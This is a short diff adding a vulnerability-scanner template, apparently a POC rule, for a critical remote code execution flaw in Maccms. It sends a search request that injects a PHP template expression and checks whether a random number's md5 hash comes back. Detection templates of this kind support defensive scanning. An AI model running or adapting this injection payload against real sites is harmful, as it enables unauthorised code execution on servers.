@@ -1,0 +1,17 @@
+id: maccms-rce
+
+info:
+    name: Maccms RCE
+    author: hanxiansheng26(https://github.com/hanxiansheng26)
+    severity: critical
+
+set:
+    r: randomInt(800000000, 1000000000)
+rules:
+    r0:
+        request:
+            method: GET
+            path: /index.php?m=vod-search&wd={if-A:printf(md5({{r}}))}{endif-A}
+        expression: response.body.bcontains(bytes(md5(string(r))))
+expression: r0()
+
